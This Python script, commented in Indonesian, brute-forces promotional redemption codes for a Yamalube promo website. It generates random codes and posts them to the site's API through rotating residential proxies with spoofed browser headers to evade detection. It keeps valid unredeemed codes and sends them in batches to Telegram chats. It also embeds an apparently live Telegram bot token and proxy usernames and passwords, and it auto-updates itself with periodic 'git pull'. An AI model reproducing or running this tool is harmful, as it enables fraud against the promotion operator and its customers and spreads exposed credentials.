import asyncio
import aiohttp
import aiofiles
import random
import time
import logging
import hashlib
from datetime import datetime
import subprocess

# Konfigurasi warna ANSI untuk output di Termux
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
WHITE = "\033[97m"
BRIGHT = "\033[1m"
RESET = "\033[0m"

# Konfigurasi logging
logging.basicConfig(
    filename=f'validation_{datetime.now().strftime("%Y%m%d_%H%M")}.log',
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Konfigurasi Telegram dan User Agents
TELEGRAM_BOT_TOKEN = '7620704354:AAFa19rWmJ3pQKEExzK4hJGxSi26BTz-t1E'
CHAT_IDS = ['6426778764', '6180131575']

# Daftar User-Agent untuk rotasi
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Konfigurasi proxy static residential
STATIC_PROXIES = [
    "45.198.6.244:7777:lv0u1e11ca:ysdoqvktjm",
    "445.198.19.92:7777:ol6amlsbuk:mruqlb11tg",
    "45.198.19.82:7777:v00hs54eoq:vaixxby9uh",
    "45.198.10.229:7777:qycd1hv50o:qt3kvvszkq",
    "45.198.10.251:7777:j3xg72jnfe:m1ra5j1335",
    "445.198.6.237:7777:45.198.6.237:e8v0c87a6j",
    "45.198.6.240:7777:8gdkmgi3te:ax78y98jhv",
    "45.198.20.86:7777:o7oklj3qj4:dq6l86onh1",
    "45.198.5.236:7777:tkh924xydl:ckh7f0cq4w",
    "45.198.22.100:7777:4bbk2qidrl:mqhogw8s4w"
]

# Konfigurasi proxy dynamic rotating residential
DYNAMIC_PROXIES = [
    {
        'proxy_host': 'as.a5hzsdfb.lunaproxy.net',
        'proxy_port': '12233',
        'proxy_username': 'termuxbot_Z7mtB',
        'proxy_password': 'Qwerty9'
    },
]

class CodeValidator:
    def __init__(self, device_id, total_devices):
        self.device_id = device_id
        self.total_devices = total_devices
        self.sem = asyncio.Semaphore(100)  # Kurangi semaphore untuk mengurangi beban
        self.batch_size = 50  # Kurangi ukuran batch
        self.retry_delay = 0.05  # Percepat retry delay
        self.valid_codes = set()
        self.prefixes = ["BY", "MF", "CW", "J8", "9L"]
        self.suffixes = ["LH", "8D", "8M", "YX", "TK", "4Y", "9Y", "9X"]
        self.total_valid = 0
        self.total_invalid = 0
        self.total_error = 0
        self.total_processed = 0
        self.valid_code_batch = []  # Menyimpan kode valid untuk rekapitulasi per batch

    def generate_code(self):
        """Generate kode dengan format [prefix][4 random alphanumeric][suffix]"""
        prefix = random.choice(self.prefixes)
        middle_part = ''.join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=4))
        suffix = random.choice(self.suffixes)
        return f"{prefix}{middle_part}{suffix}"

    async def validate_code(self, session, code):
        async with self.sem:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/json',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'origin': 'https://yamalubepromo.com',
                'referer': 'https://yamalubepromo.com/',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
            }
            payload = {"uniq_code": code}

            for attempt in range(2):  # Kurangi jumlah retry
                proxy = random.choice(STATIC_PROXIES + DYNAMIC_PROXIES)
                if isinstance(proxy, dict):
                    proxy_url = f"http://{proxy['proxy_host']}:{proxy['proxy_port']}"
                    proxy_auth = aiohttp.BasicAuth(
                        login=proxy['proxy_username'],
                        password=proxy['proxy_password']
                    )
                else:
                    proxy_url = f"http://{proxy}"
                    proxy_auth = None

                try:
                    async with session.post(
                        'https://dashboard.yamalubepromo.com/api/v1/wziioquyqthkal',
                        json=payload,
                        headers=headers,
                        proxy=proxy_url,
                        proxy_auth=proxy_auth,
                        timeout=5  # Percepat timeout
                    ) as response:
                        if response.status == 200:
                            resp_json = await response.json()
                            if (
                                resp_json.get("meta", {}).get("code") == 200 and
                                resp_json.get("data", {}).get("is_avaliable") is True and
                                resp_json.get("data", {}).get("is_redeem") is False
                            ):
                                await self.record_valid_code(code)
                                self.total_valid += 1
                                print(f"{BRIGHT}{GREEN}**KODE VALID**:{RESET}\n{GREEN}{code}{RESET}")
                                return code, 200, "Code is available and not redeemed"
                            else:
                                self.total_invalid += 1
                                return code, 400, "Code is invalid or already redeemed"
                        elif response.status == 400:
                            self.total_invalid += 1
                            return code, 400, await response.text()
                except Exception as e:
                    self.total_error += 1
                    logger.error(f"Proxy error for {code}: {e}")
                    await asyncio.sleep(self.retry_delay * (2 ** attempt))  # Exponential backoff
                    continue

            return code, 500, "Failed after retries"

    async def record_valid_code(self, code):
        """Simpan kode valid dan tambahkan ke batch untuk rekapitulasi"""
        async with aiofiles.open('valid_codes.txt', 'a') as f:
            await f.write(f"{code}\n")
        
        # Tambahkan kode ke batch untuk rekapitulasi
        self.valid_code_batch.append(code)
        
        # Jika sudah mencapai 100 kode, kirim rekapitulasi ke Telegram
        if len(self.valid_code_batch) >= 500:
            await self.send_batch_recap()

    async def send_batch_recap(self):
        """Kirim rekapitulasi batch dari 100 kode valid"""
        mac_address = self.get_mac_address()
        recap_message = f"\n".join(self.valid_code_batch)

        for chat_id in CHAT_IDS:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {'chat_id': chat_id, 'text': recap_message}
            async with aiohttp.ClientSession() as session:
                await session.post(url, data=payload)
        
        # Reset batch setelah pengiriman
        self.valid_code_batch = []

    def get_mac_address(self):
        """Dapatkan alamat MAC perangkat untuk identifikasi unik"""
        try:
            with open('/sys/class/net/wlan0/address', 'r') as f:
                return f.read().strip()
        except:
            return "Hidden MAC"

    def display_status(self, elapsed_time):
        print(
            f"{YELLOW}Device: {self.device_id}{RESET}\n"
            f"{BLUE}Total Validasi Kode: {self.total_processed}{RESET}\n"
            f"{GREEN}Total Kode Valid: {self.total_valid}{RESET}\n"
            f"{YELLOW}Total Kode Invalid: {self.total_invalid}{RESET}\n"
            f"{RED}Total Kode Error: {self.total_error}{RESET}\n"
            f"{WHITE}Waktu Validasi: {elapsed_time:.2f} detik{RESET}\n"
        )

async def check_for_updates():
    """Pengecekan update di GitHub setiap 5 menit"""
    while True:
        try:
            result = subprocess.run(["git", "pull"], capture_output=True, text=True)
            if "Already up to date." not in result.stdout:
                print(f"{GREEN}Skrip diperbarui dari GitHub!{RESET}")
        except Exception as e:
            print(f"{RED}Gagal memeriksa pembaruan: {e}{RESET}")
        await asyncio.sleep(300)

async def main():
    start_time = time.time()
    device_id = 1  # Inisialisasi device_id dengan angka contoh
    total_devices = 5  # Total perangkat contoh
    validator = CodeValidator(device_id, total_devices)
    
    update_task = asyncio.create_task(check_for_updates())  # Task untuk cek update berkala

    async with aiohttp.ClientSession() as session:
        while True:
            # Generate dan validasi batch kode
            codes = [validator.generate_code() for _ in range(validator.batch_size)]
            tasks = [validator.validate_code(session, code) for code in codes]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Hitung total yang sudah divalidasi dan tampilkan statusnya
            validator.total_processed = len([r for r in results if isinstance(r, tuple)])
            elapsed_time = time.time() - start_time
            validator.display_status(elapsed_time)

            await asyncio.sleep(0.1)  # Tunggu sebentar sebelum batch berikutnya

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Shutting down...{RESET}")
    except Exception as e:
        print(f"\n{RED}Error: {e}{RESET}")
        logger.error(f"Fatal error: {e}")
